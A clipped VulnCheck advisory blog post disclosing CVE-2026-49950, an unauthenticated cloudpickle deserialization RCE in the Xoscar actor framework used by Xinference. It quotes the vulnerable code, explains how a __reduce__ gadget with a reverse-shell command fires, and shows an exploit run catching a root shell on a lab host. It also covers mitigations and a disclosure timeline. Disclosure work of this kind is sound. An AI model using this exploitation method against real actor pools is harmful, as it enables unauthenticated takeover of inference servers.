---
title: "Xorbits Xoscar: Unauthenticated RCE via Cloudpickle Deserialization in the Actor Pool | Blog | VulnCheck"
source: https://www.vulncheck.com/blog/xorbits-xoscar-unauth-cloudpickle-rce
source_host: www.vulncheck.com
clip_date: 2026-10-16T11:54:23+08:00
trace_id: 9eb8bc48-57f8-4142-84bd-e21d83af5078
content_hash: 0ae084ce1514bb9568c5378c09a46037c54df63cf82376770b54b84a3933f274
status: synced
tags:
  - 漏洞分析
  - AI应用
series: null
feed_source: VulnCheck·漏洞研究
ai_summary: Xoscar 的 actor 池在收到消息后先 `cloudpickle.loads` 再判断类型，且整条通道无认证，任何能连上端口的人都能未授权执行代码（CVE-2026-49950）。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 3fb75244-d011-81ed-8aa8-fce2b2c166c6
ioc:
  cves:
    - CVE-2023-48022
    - CVE-2026-49950
  cwes:
    - CWE-502
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> Xoscar 的 actor 池在收到消息后先 `cloudpickle.loads` 再判断类型，且整条通道无认证，任何能连上端口的人都能未授权执行代码（CVE-2026-49950）。
> 
> - **漏洞位置：** 接收路径 `socket.py` 的 recv 直接把帧体交给 `serialization/core.pyx` 的 `unpickle_buffers`，对首个 buffer 调 `cloudpickle.loads()`，反序列化在消息类型校验之前发生（CWE-502）。
> - **唯一前置校验：** 仅一字节协议版本号（合法值 1）属于分帧检查而非安全校验；无 token、无受限 unpickler、无消息类型白名单，`__reduce__` gadget 可返回 `os.system` 执行命令。
> - **影响范围：** Xoscar 自 v0.1.0 起所有已发布版本均受影响，最新 v0.11.2 sink 依旧存在，撰写时无修复版本。
> - **暴露面：** 单节点绑定随机本地端口；Xinference 分布式模式默认绑定 `0.0.0.0`，集群内网可达即可打；端口无 banner，难以被互联网扫描发现，现实攻击者需已有内网立足点。
> - **验证与缓解：** go-exploit 模块发送约 177 字节单帧即获 root shell（内存执行、不落盘）；在消息认证层或安全反序列化器落地前，只能靠网络隔离与防火墙/私有子网限制端口。

## Summary

VulnCheck is disclosing [CVE-2026-49950](https://console.vulncheck.com/cve/CVE-2026-49950), a deserialization vulnerability in Xorbits Xoscar that allows for unauthenticated remote code execution. The bug is not in an application endpoint; it is in the transport layer of the actor framework itself. An actor pool is Xoscar's unit of concurrency: a process that hosts actors and exchanges messages with other pools over TCP. Every message that reaches a pool is deserialized with `cloudpickle` before the pool looks at the message type, and there is no authentication anywhere on that path.

[Xoscar](https://github.com/xorbitsai/xoscar) is the Python actor and RPC framework that [Xinference](https://github.com/xorbitsai/inference) (~9.3k stars) and the wider Xorbits stack are built on. Workers, the supervisor, and the model pools all talk to each other through Xoscar actor pools. Those pools frame each message, then hand the body to `cloudpickle.loads()`. `cloudpickle` is `pickle` with extended object support, so a message carrying a `__reduce__` gadget runs arbitrary code during deserialization, before the pool ever inspects what kind of message it received. Any client that can reach the actor port runs code as the pool process, typically root on a GPU node (CWE-502).

VulnCheck is disclosing this vulnerability in accordance with its [coordinated vulnerability disclosure policy](https://vulncheck.com/vulnerability-disclosure-policy).

**Affected:** all released versions of Xoscar, back to v0.1.0. The sink is still present in the latest release (v0.11.2) and there is no fixed version at the time of writing.

**Reachability and impact:** in a single-node install the actor pool listens on a random local port, but Xinference's distributed mode binds the pool to `0.0.0.0` by default (`XINFERENCE_DEFAULT_DISTRIBUTED_HOST`, and the Docker instructions require `-H 0.0.0.0`), so on a cluster the port is exposed to the network. Anyone who can reach it, including an attacker with a foothold on the same internal network, gets code execution with no credentials. This is the same deserialization-in-the-transport class as the Ray "ShadowRay" issue ([CVE-2023-48022](https://console.vulncheck.com/cve/CVE-2023-48022)).

## The vulnerability

The receive path is in `backends/communication/socket.py`. `SocketChannel.recv` reads the frame header, reads the body buffers, and hands both straight to `deserialize` ([socket.py:99](https://github.com/xorbitsai/xoscar/blob/ef2af816d34f3493bab9b5736fa612f78c7ef1a8/python/xoscar/backends/communication/socket.py#L99)):

```md
async def recv(self):
    deserializer = AioDeserializer(self.reader)
    header = await deserializer.get_header()
    buffers = await read_buffers(header, self.reader)
    return deserialize(header, buffers)
```

`deserialize` dispatches to `unpickle_buffers` in `serialization/core.pyx`, which calls `cloudpickle.loads()` on the first body buffer ([core.pyx:253](https://github.com/xorbitsai/xoscar/blob/ef2af816d34f3493bab9b5736fa612f78c7ef1a8/python/xoscar/serialization/core.pyx#L253)):

```md
def unpickle_buffers(list buffers):
    if buffers[0] == b"__fury__":
        fury = get_fury()
        if fury is None:
            raise Exception("fury is not installed.")
        result = fury.deserialize(buffers[1], buffers[2:])
    else:
        result = cloudpickle.loads(buffers[0], buffers=buffers[1:])
    return result
```

This runs inside `recv()`. The pool deserializes the whole message, including the attacker-controlled body, and only afterward does the caller look at the message object to decide what it is and whether to act on it. There is no authentication token on the channel, no restricted unpickler, and no allowlist of message types gating the `cloudpickle.loads()` call. The only thing checked before the body is read is a one-byte protocol version, in `get_header_length` ([aio.py:76](https://github.com/xorbitsai/xoscar/blob/ef2af816d34f3493bab9b5736fa612f78c7ef1a8/python/xoscar/serialization/aio.py#L76)):

```md
def get_header_length(header_bytes: bytes):
    version = struct.unpack("B", header_bytes[:1])[0]
    if version != DEFAULT_SERIALIZATION_VERSION:
        raise EOFError(MALFORMED_MSG)
    ...
```

That version byte is a framing check, not a security check: a valid message just sets it to `1`. It is `cloudpickle` reachable by any peer that speaks the framing, which is the whole bug.

## Exploitation

A Xoscar message is a small binary frame: an 11-byte prefix (one version byte set to `1`, the header length as a little-endian `uint64`, a `uint16` compression flag), then a `cloudpickle` header that carries the buffer sizes, then the body buffers. The pool reads the prefix, validates the version byte, `cloudpickle.loads()` the header, then reads the body buffers and `cloudpickle.loads()` the first one. Putting a `__reduce__` gadget in that first body buffer is the whole exploit: the gadget returns `(os.system, ("<reverse-shell one-liner>",))`, so it runs during the `cloudpickle.loads()` in `unpickle_buffers`, before the pool validates the message type. The pool then errors on the unexpected object, but the command has already executed.

VulnCheck's [go-exploit](https://github.com/vulncheck-oss/go-exploit) module for CVE-2026-49950 builds that frame and fires it. On a lab pool the caught shell is root:

```md
$ ./build/cve-2026-49950_linux-amd64 -rhost 10.9.49.1 -rport 9999 -lhost 10.12.70.1 -lport 4444 -c2 SimpleShellServer -e
level=STATUS  msg="Starting listener on 10.12.70.1:4444"
level=STATUS  msg="Building reverse shell to 10.12.70.1:4444"
level=STATUS  msg="Sending xoscar deserialization frame (177 bytes) to 10.9.49.1:9999"
level=SUCCESS msg="Caught new shell from 10.9.49.1:42812"
level=STATUS  msg="Active shell from 10.9.49.1:42812"
id; uname -a; pwd
uid=0(root) gid=0(root) groups=0(root)
Linux pool 7.0.0-generic #1 SMP x86_64 GNU/Linux
/app
level=SUCCESS msg="Exploit successfully completed" exploited=true
```

One message, no credentials, no second request. Nothing is written to disk: the gadget fires in memory during deserialization and the connection can be dropped immediately after.

### Note on reproduction

The vulnerable path does not need a model loaded or a GPU present: `cloudpickle.loads()` fires as soon as the body buffer is read, ahead of any actor logic. Reproducing against a real Xinference deployment does need the stack running so a pool is listening, but the sink itself is reachable the moment the pool accepts a connection. The vulnerability is confirmed by source review across every released version and by a working exploit against a live pool.

## Reachability and threat model

Xoscar is a library, so the exposure depends on how the application on top of it binds the pool.

-   **No authentication.** The actor channel authenticates nothing. Whoever reaches the port runs code as the pool process, which on a model node holds the loaded models, the data passing through inference, and the GPUs.
-   **Internal network first.** On a single node, `get_next_port` picks a random port in 10000-65535 bound locally, so the exposure is local. In Xinference's distributed mode the supervisor and workers bind to `0.0.0.0` by default, so on a cluster the pool port is reachable across the internal network. A LAN-adjacent attacker, or one with an existing foothold, pivots to code execution on the inference host with no credentials.
-   **Fingerprinting.** The actor port carries no banner and, in single-node installs, is a random ephemeral port, so it is not something you find by internet-wide scanning. The Xinference REST API (default port 9997) is fingerprintable, but it does not reach the actor-pool sink. The realistic attacker already has internal network access, not an internet scan hit.

Network reachability is the only boundary here. On shared cluster or cloud GPU infrastructure that boundary is routinely weaker than assumed, and network-level access is not authentication: once a host on the network can reach the pool port, the pool runs whatever it is sent.

## Impact

Successful exploitation is unauthenticated remote code execution as the actor-pool process, commonly root on a GPU node. From there an attacker has the models loaded into the pool, the data flowing through inference, the GPU resources, and a foothold to move laterally across the cluster. No credentials, no user interaction, a single message.

## Remediation

There is no fixed release at the time of writing; the `cloudpickle.loads()` path is present in the latest version (v0.11.2). Until the project ships a message authentication layer or a safe deserializer on the actor channel, the mitigation is network isolation:

-   Never expose an actor-pool port to an untrusted network. In Xinference distributed deployments, keep the supervisor and worker ports on a private segment and do not publish them past the cluster.
-   Put the inference cluster behind strict network policy (firewall rules, a private subnet, or a service mesh with mutual authentication) so only the intended pool peers can reach the ports.
-   Treat any host that can reach an actor pool as able to run code on it, and scope trust accordingly.

## Timeline

| Date | Event |
| --- | --- |
| 2026-06-08 | Vulnerability reported to VulnCheck; CVE-2026-49950 requested and provisionally allocated via the VulnCheck CNA |
| 2026-10-06 | 120-day coordinated-disclosure deadline reached, no vendor fix |
| 2026-10-13 | CVE-2026-49950 published |
| 2026-10-16 | This disclosure |

The vulnerability was reported to VulnCheck and a CVE was requested through the VulnCheck CNA. The 120-day coordinated-disclosure window elapsed with no fixed release from the project. Disclosure proceeds per VulnCheck's coordinated disclosure policy.

## Takeaways

The bug is a deserialization sink in a transport layer, not in an application endpoint, which is what makes it easy to miss. Xoscar moves actor messages with `cloudpickle`, the same way a lot of Python RPC and distributed-compute frameworks do, and treats the network boundary as the trust boundary. That holds only as long as nothing untrusted can reach the port, and on a shared GPU cluster that assumption breaks the moment one host is reachable by someone it was not meant to be. It is the same shape as the Ray "ShadowRay" issue: an internal RPC surface that deserializes attacker-controlled bytes, exposed to the network because a distributed mode binds it there. For anyone running Xinference or Xorbits in distributed mode, the action is to keep the actor-pool ports off any untrusted network until a fixed release exists.

## About VulnCheck

VulnCheck empowers organizations to transcend the challenges of vulnerability prioritization. Our suite of solutions provides product managers, PSIRT teams, and threat hunters with the tools required for accelerated, high-precision operations and infinite efficiency.

Recognizing the industry-wide necessity for superior data velocity and accuracy, we deliver high-fidelity insights to the market. We remain committed to surfacing critical intelligence on vulnerability exploitation and emerging trends, leveraging our unique dataset to support the practitioner community.

To deepen your understanding of these threats, [VulnCheck Exploit & Vulnerability Intelligence](https://vulncheck.com/product/exploit-intelligence) provides comprehensive coverage of global threat actors. Register for a demo to explore our intelligence today.
